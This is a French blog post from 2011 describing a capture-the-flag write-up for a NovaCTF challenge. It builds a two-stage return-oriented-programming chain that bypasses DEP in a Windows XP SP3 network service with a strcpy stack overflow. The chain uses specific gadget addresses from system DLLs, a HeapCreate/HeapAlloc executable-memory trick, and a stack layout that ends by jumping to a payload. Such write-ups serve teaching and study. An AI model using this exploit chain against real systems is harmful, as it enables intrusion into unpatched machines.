<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>[Exploitation] NovaCTF January 2011: ROPPING</title>
  <meta name="description" content="Bonjour,">

  <link rel="stylesheet" href="/assets/css/main.css">
  <link rel="canonical" href="/2011/02/09/exploitation-novactf-january-2011_09.html">
  <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
</head>


  <body>

    <header class="site-header">

  <div class="wrapper">

    <a class="site-title" href="/">Binary World for Binary People :)</a>

    <!--
    <h2 class="site-subtitle">
        <span class="site-subtitle-quote">"empty
"</span>
        <span class="site-subtitle-author">- no_author -</span>
    </h2>
    -->

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      
      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
          
        
        <a class="page-link" href="/blog/">Blog</a>
      </div>
      
    </nav>

  </div>

</header>


    <div class="page-content">
      <div class="wrapper">
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">[Exploitation] NovaCTF January 2011: ROPPING</h1>
    <p class="post-meta"><time datetime="2011-02-09T13:16:00+01:00" itemprop="datePublished">Feb 9, 2011</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">m_101</span></span></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <p>Bonjour,</p>

<p>Aujourd’hui on va attaquer le challenge du NovaCTF de Janvier de manière différente.</p>

<p>La dernière fois nous avons fais usage d’un stack pivot, egg hunter et payload … mais le problème est que tout celà s’exécute sur la pile. En cas de DEP ça ne marcherait pas.</p>

<p>Nous allons donc remédier à celà, par contre on perd le bypass ASLR :( (si quelqu’un a une idée pour ASLR+DEP bypass sur ce challenge, je serais intéressé :)).</p>

<h1 id="pré-requis">Pré-requis</h1>

<p>Avant de commencer, je vais pour une fois donner les pré-requis nécessaire à la bonne compréhension de l’article suivant.</p>

<p>Tout d’abord vous devez être à l’aise en exploitation de stack based buffer overflow.</p>

<p>Ensuite un minimum de connaissances en ASMx86, Windows et sockets est recommendée. En effet, une compréhension de la partie vulnérable est essentielle car on fait usage de ces connaissances pour rediriger le flux d’exécution à notre bon vouloir.</p>

<p>On va utiliser Immunity Debugger avec le plugin pvefindaddr, le tout sous Windows XP SP3 English.</p>

<h1 id="rop--return-oriented-programming">ROP : Return Oriented Programming?</h1>

<p>Le ropping est une technique de re-utilisation de code au même titre que ret2lib, ret2esp. Elle est utilisée afin de bypasser le DEP sans code ou pour rendre l’exécution de code possible. Celà consiste à chaîner plusieurs séquences d’instructions terminant par RET. On appelle ces séquences des gadgets, un gadget effectue une action bien précise comme une addition ou autre.</p>

<p>L’avantage d’une telle technique c’est qu’elle fait usage de zone exécutable et donc bypasse le DEP sans problème. L’inconvénient majeur est qu’on doit hard coder pas mal d’addresses, on doit connaître ces addresses d’avance et donc en cas d’ASLR ça devient déjà plus difficile. L’une des méthodes utilisées est de travailler avec des offsets, en effet, avec l’ASLR, l’address space layout change mais pas les offsets entre chaque éléments.</p>

<h1 id="préparation">Préparation</h1>

<p>On a besoin de créer une liste de gadgets afin de pouvoir choisir dans cette liste et créer notre payload ROP.</p>

<p>Immunity Debugger est le debugger utilisé ici pour effectuer celà.</p>

<p>En effet, il intègre la DEPlib et le plugin de corelanc0d3r répond entièrement à nos besoins également.</p>

<h1 id="lets-rop-it">Let’s ROP it!</h1>

<p>Bon je vais passer la phase de triggering vu qu’on l’a déjà vu dans mon article précédent, on va se concentrer sur l’exploitation à proprement parler.</p>

<p>L’exploitation va se dérouler en plusieurs phase:</p>

<ul>
  <li>stage 1: mise en place d’un environnement propice à l’exécution de code</li>
  <li>stage 2: exécution de code
C’est une attaque multi-stage plutôt que one-stage.</li>
</ul>

<p>Afin d’y arriver, il faut d’abord “pivoter” le stack pointer afin qu’il pointe sur une zone qu’on contrôle.</p>

<h1 id="first-stage-rop-stack">First stage ROP stack</h1>

<p>Revoyons le code de la fonction vulnérable si vous voulez bien :).</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">vuln_function</span>   <span class="n">proc</span> <span class="n">near</span>               <span class="c">; CODE XREF: main+2CC p</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">local_buf</span>       <span class="o">=</span> <span class="n">byte</span> <span class="n">ptr</span> <span class="o">-</span><span class="mi">100</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span> <span class="n">recv_buf</span>        <span class="o">=</span> <span class="n">dword</span> <span class="n">ptr</span>  <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401000</span>                 <span class="k">push</span>    <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401001</span>                 <span class="k">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401003</span>                 <span class="k">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">100</span><span class="n">h</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401009</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">recv_buf</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040100</span><span class="n">C</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; char *</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040100</span><span class="n">D</span>                 <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">local_buf</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401013</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; char *</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401014</span>                 <span class="k">call</span>    <span class="n">_strcpy</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401019</span>                 <span class="k">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">8</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040101</span><span class="n">C</span>                 <span class="k">mov</span>     <span class="n">esp</span><span class="p">,</span> <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040101</span><span class="n">E</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040101</span><span class="n">F</span>                 <span class="k">retn</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040101</span><span class="n">F</span> <span class="n">vuln_function</span>   <span class="n">endp</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Avant l’appel du strcpy():</p>

<ul>
  <li>EAX pointe vers l’addresse du buffer que recv() utilise afin de recevoir ce qu’on envoie.</li>
  <li>ECX contient l’addresse du buffer local à overflow.</li>
</ul>

<p>Après l’appel du strcpy():</p>

<ul>
  <li>EAX pointe vers notre buffer local.</li>
  <li>ECX pointe vers recv_buf+260 (260 = longueur de la chaîne qu’on envoie).</li>
</ul>

<p>Donc pour pivoter la stack, il suffit de trouver un pointeur vers une instruction de type:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="code"><pre>xchg eax, esp
mov eax, ecx
xchg eax, ecx
mov eax, esp
push eax; pop esp
push ecx; pop eax</pre></td></tr></tbody></table></code></pre></figure>

<p>Ca nous permettra de pivoter la stack et directement tomber après le contenu de local_buf dans recv_buf.</p>

<p>Pour trouver des pointeurs vers des gadgets avec pvefindaddr, il suffit d’utiliser la commande suivante:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre>!pvefindaddr rop options</pre></td></tr></tbody></table></code></pre></figure>

<p>Le manuel:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre>imm.log("* rop [-m &lt;module&gt;] [-f &lt;filter&gt;] [-n] [-o] [-i] [-r max_ret_value] [-s] [-d] [-c &lt;instruction&gt;]")
 imm.log("                               (List possible ROP gadgets from non-ASLR protected modules. You can optionally filter)")
 imm.log("                                Option -n : don't show pointers that contain null bytes")
 imm.log("                                Option -o : don't show pointers from modules in the Windows folder")
 imm.log("                                Option -i : don't show pointers from modules that have the Fixup flag set")
 imm.log("                                Parameter -r allows you to specify the maximum RET offset to look for. Default value : 32")
 imm.log("                                Warning : if you don't specify a module and/or a lower RET offset, the process can take a very long time to complete")
 imm.log("                                The -s option will split the rop output into a dedicated file per module. The filenames will include")
 imm.log("                                modulename, version, OS type and OS version")
 imm.log("                                Option -d will search deeper (longer) and might find possibly interesting gadgets")
 imm.log("                                Option -c + instruction (no quotes, spaces are allowed) will allow you to look for gadgets ending with this instruction")
 imm.log("                                as opposed to looking for gadgets ending with RET")</pre></td></tr></tbody></table></code></pre></figure>

<p>On va commencer par pivoter ESP vers le début de notre buffer local, j’ai trouvé ce gadget:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x77C3A891 : EAX :   # XCHG EAX,ESP # RETN - msvcrt.dll -  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>A partir de là, on veut “remonter” vers notre recv_buffer, la raison en est simple: recv() copie TOUT et ne s’arrête donc pas aux 0 comme strcpy() donc aucunes grandes contraintes. Je fais celà avec le gadget suivant:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x7C902B30 : # MOV EAX,ECX # BSWAP EAX # RETN - ntdll.dll -  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>BSWAP change l’ordre de nos bits entre little endian et big endian, il faut donc l’appeller encore pour fixer EAX.</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x7C902B32 : # BSWAP EAX # RETN - ntdll.dll -  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>Et la on peut enfin pivoter le stack pointer :).</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x77C3A891 : EAX :   # XCHG EAX,ESP # RETN - msvcrt.dll -  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>Donc notre pile pour l’instant ressemble à ça:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="code"><pre>---------------------------------
recv_buf        |   0x7C902B30  |   mov eax, ecx
---------------------------------
recv_buf+4      |   0x7C902B32  |   fix eax (big endian -&gt; little endian)
---------------------------------
recv_buf+8      |   0x77C3A891  |   mov esp, eax    // on est dans recv_buffer
---------------------------------
recv_buf+12     |   JUNK        |
                |     ...       |
                |   JUNK        |
---------------------------------
recv_buf+260    |   0x77C3A891  |   mov esp, eax    // on est dans local_buffer
---------------------------------
recv_buf+264    |   0x00000000  | // pour finir la copie de strcpy()
---------------------------------</pre></td></tr></tbody></table></code></pre></figure>

<p>Maintenant on doit allouer de la mémoire exécutable.</p>

<p>De ce que j’ai pu remarquer de mes différents tests et en regardant la memory map avec Alt+M:</p>

<p><img src="/assets/img/novactf_memory_map.png" alt="NovaCTF Memory Map" /></p>

<p>On remarque que la heap n’est pas exécutable (36xxx dans ce cas dans mes tests).</p>

<p>Il faut donc créer une nouvelle heap avec HeapCreate() et allouer de la mémoire à partir de celle-ci. On retrouve un appel à celui-ci d’ailleurs:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D89</span> <span class="n">sub_403D89</span>      <span class="n">proc</span> <span class="n">near</span>               <span class="c">; CODE XREF: start:loc_4016DD p</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D89</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; dwMaximumSize</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D8B</span>                 <span class="k">push</span>    <span class="mi">1000</span><span class="n">h</span>           <span class="c">; dwInitialSize</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D90</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; flOptions</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D92</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">HeapCreate</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D98</span>                 <span class="k">xor</span>     <span class="n">ecx</span><span class="p">,</span> <span class="n">ecx</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D9A</span>                 <span class="k">test</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D9C</span>                 <span class="k">setnz</span>   <span class="n">cl</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">D9F</span>                 <span class="k">mov</span>     <span class="n">hHeap</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">DA4</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">ecx</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">DA6</span>                 <span class="k">retn</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00403</span><span class="n">DA6</span> <span class="n">sub_403D89</span>      <span class="n">endp</span></pre></td></tr></tbody></table></code></pre></figure>
<p>La heap créée est référencé dans une variable globale comme on peut le voir. On contrôle la pile entièrement et aucunes contraintes niveau caractères utilisés donc voilà ce que ça donne:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre>---------------------------------
recv_buf+268    |   0x00403D92  |   call ds:HeapCreate
---------------------------------
recv_buf+272    |   0x00004000  |   flOptions = HEAP_CREATE_ENABLE_EXECUTE
---------------------------------
recv_buf+276    |   0x00001000  |   dwInitialSize = 0x1000
---------------------------------
recv_buf+280    |   0x00001000  |   # dwMaximumSize = 0 = depend on available memory
---------------------------------</pre></td></tr></tbody></table></code></pre></figure>

<p>Maintenant l’allocation de notre mémoire:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">DED</span>                 <span class="k">push</span>    <span class="n">esi</span>             <span class="c">; dwBytes</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">DEE</span>                 <span class="k">push</span>    <span class="mi">8</span>               <span class="c">; dwFlags</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">DF0</span>                 <span class="k">push</span>    <span class="n">hHeap</span>           <span class="c">; hHeap</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">DF6</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">HeapAlloc</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">DFC</span>                 <span class="k">test</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">DFE</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_405E32</span>

<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">E32</span> <span class="n">loc_405E32</span><span class="o">:</span>                             <span class="c">; CODE XREF: sub_405DB3+4B j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">E32</span>                                         <span class="c">; sub_405DB3+70 j ...</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">E32</span>                 <span class="k">pop</span>     <span class="n">esi</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">E33</span>                 <span class="k">pop</span>     <span class="n">ebp</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">E34</span>                 <span class="k">retn</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00405</span><span class="n">E34</span> <span class="n">sub_405DB3</span>      <span class="n">endp</span></pre></td></tr></tbody></table></code></pre></figure>

<p>On voit qu’il faut qu’on définisse notre ESI first ensuite qu’on retourne sur 0x00405DED. Vous pourrez remarquer que hHeap est utilisé directement après, ça nous facilite beaucoup les choses. Il faut absolument que la mémoire soit allouée, l’exécution de code sera compromise mais généralement on a notre mémoire qui est allouée ;).</p>

<p>Pour ESI, j’ai trouvé le gadget suivant:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x7C87283A :  # POP ESI # RETN  [Module : kernel32.dll]  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>Et n’oublions pas de prévoir du junk pour nos pop esi; pop ebp
Notre ROP stack donne ainsi celà:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="code"><pre>---------------------------------
recv_buf+284    |   0x7C87283A  |   pop esi
---------------------------------
recv_buf+288    |   0x00004000  |   esi value to pop
---------------------------------
recv_buf+292    |   0x00405DED  |   call ds:HeapAlloc
---------------------------------
recv_buf+296    |       JUNK    |   junk pour pop esi
---------------------------------
recv_buf+300    |       JUNK    |   junk pour pop ebp
---------------------------------</pre></td></tr></tbody></table></code></pre></figure>

<p>On a presque fini le first stage :).</p>

<p>Dans ce challenge, le serveur reçoit de la data par le biais de la routine suivante:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">A6</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; flags</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">A8</span>                 <span class="k">push</span>    <span class="mi">800</span><span class="n">h</span>            <span class="c">; len</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">AD</span>                 <span class="k">lea</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">B3</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; buf</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">B4</span>                 <span class="k">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">client_sockfd</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">B7</span>                 <span class="k">push</span>    <span class="n">edx</span>             <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">B8</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">recv</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Le but serait donc de faire pointer EBP vers notre heap nouvellement allouée afin qu’il réceptionne notre payload.</p>

<p>Il faut prendre en compte l’offset de buf (-0x9A0) afin d’éviter de corrompre la heap et rendre notre exploit moins fiable par la suite. Pour celà, il faut additionner +0x9A0 au moins à EAX (qui contient notre mémoire allouée):</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x77EBB583 :  {POP}  # ADD EAX,6FF # POP ESI # POP EBP # RETN 4  [Module : RPCRT4.dll]  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>Ce qui donne donc:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="code"><pre>---------------------------------
recv_buf+304    |   0x77ebb583  |   add eax, 0x6ff
---------------------------------
recv_buf+308    |       JUNK    |   junk pour pop esi
---------------------------------
recv_buf+312    |       JUNK    |   junk pour pop ebp
---------------------------------
recv_buf+316    |   0x77ebb583  |   add eax, 0x6ff
---------------------------------
recv_buf+320    |       JUNK    |   junk pour ret 4
---------------------------------
recv_buf+324    |       JUNK    |   junk pour pop esi
---------------------------------
recv_buf+328    |       JUNK    |   junk pour pop ebp
---------------------------------</pre></td></tr></tbody></table></code></pre></figure>

<p>On set EBP à EAX:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
</pre></td><td class="code"><pre># 0x77EF022c :  # PUSH EAX # POP EBP # RETN 4  [Module : RPCRT4.dll]  ** </pre></td></tr></tbody></table></code></pre></figure>

<p>Et aussi on doit retourner sur recv() mais le problème est que sockfd se trouve trop loin sur la pile pour pouvoir le récupérer. On met donc en place une nouvelle socket entièrement en retournant tout au début de la routine pour la socket. Nous n’avons pas besoin d’appeler WSAStartup() vu qu’aucuns appel à WSACleanup() n’a été fait. On va donc retourner juste après en 0x004010AF où on a les instructions suivantes:</p>

<ul>
  <li>mise en place de sin_addr_in</li>
  <li>getaddrinfo()</li>
  <li>socket()</li>
  <li>bind()</li>
  <li>listen()</li>
  <li>accept()</li>
  <li>recv()</li>
  <li>vuln_function()</li>
  <li>send()</li>
  <li>exit()</li>
</ul>

<p>Je vous passe les détails, je suppose que vous connaissez les sockets un minimum ;).
En effet, c’est possible car après le accept(), la socket bindée au port 1337 est fermé et est donc re-disponible.</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="code"><pre><span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401257</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; addrlen</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401259</span>                 <span class="k">push</span>    <span class="mi">0</span>               <span class="c">; addr</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040125</span><span class="n">B</span>                 <span class="k">mov</span>     <span class="n">ecx</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">server_sockfd</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040125</span><span class="n">E</span>                 <span class="k">push</span>    <span class="n">ecx</span>             <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040125</span><span class="n">F</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">accept</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401265</span>                 <span class="k">mov</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">client_sockfd</span><span class="err">]</span><span class="p">,</span> <span class="n">eax</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">00401268</span>                 <span class="k">cmp</span>     <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">client_sockfd</span><span class="err">]</span><span class="p">,</span> <span class="mi">0</span><span class="n">FFFFFFFFh</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040126</span><span class="n">C</span>                 <span class="k">jnz</span>     <span class="n">short</span> <span class="n">loc_40129C</span>

<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040129</span><span class="n">C</span> <span class="n">loc_40129C</span><span class="o">:</span>                             <span class="c">; CODE XREF: main+24C j</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040129</span><span class="n">C</span>                 <span class="k">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">server_sockfd</span><span class="err">]</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">0040129</span><span class="n">F</span>                 <span class="k">push</span>    <span class="n">eax</span>             <span class="c">; s</span>
<span class="p">.</span><span class="n">text</span><span class="o">:</span><span class="mi">004012</span><span class="n">A0</span>                 <span class="k">call</span>    <span class="n">ds</span><span class="o">:</span><span class="n">closesocket</span></pre></td></tr></tbody></table></code></pre></figure>

<p>Au final, nous avons celà:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="code"><pre>---------------------------------
recv_buf+332    |   0x77ef022c  |   mov ebp, eax
---------------------------------
recv_buf+336    |       JUNK    |   junk pour pop ebp
---------------------------------
recv_buf+340    |   0x004010AF  |   recv()
---------------------------------
recv_buf+344    |       JUNK    |   junk pour pop ebp
---------------------------------</pre></td></tr></tbody></table></code></pre></figure>

<p>Et voilà pour le premier stage, soit 348 octets de rop stack.</p>

<p>Passons maintenant au second stage où on va recevoir et exécuter notre payload.</p>

<h1 id="second-stage-rop-stack">Second stage ROP stack</h1>

<p>Là ça va être beaucoup plus rapide:</p>

<ul>
  <li>On va pivoter la stack pour retomber à recv_buf+260</li>
  <li>On exécute notre code</li>
</ul>

<p>On obtient la rop stack suivante:</p>

<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre></td><td class="code"><pre>---------------------------------
recv_buf        |   0x7C902B30  |   mov eax, ecx
---------------------------------
recv_buf+4      |   0x7C902B32  |   fix eax (big endian -&gt; little endian)
---------------------------------
recv_buf+8      |   0x77C3A613  |   jmp eax (on exécute notre code)
---------------------------------
recv_buf+12     |   JUNK        |
                |     ...       |
                |   JUNK        |
---------------------------------
recv_buf+260    |   0x77C3A891  |   mov esp, eax    // on est dans local_buffer
---------------------------------
recv_buf+264    |   0x00000000  | // pour finir la copie de strcpy()
---------------------------------
                |               |
recv_buf+268    |    PAYLOAD    |
                |               |
---------------------------------</pre></td></tr></tbody></table></code></pre></figure>

<p>Et voilà on finit par exécuter notre code dans un environnement DEP.</p>

<p>Par contre, vu le nombre de pointeurs hard codés utilisés, on perd l’ASLR bypass, si vous trouvez un moyen d’avoir DEP+ASLR bypass ça m’intéresse :). Ou si vous vous êtes pris d’une autre manière pour le DEP bypass, ça m’intéresse également ;).</p>

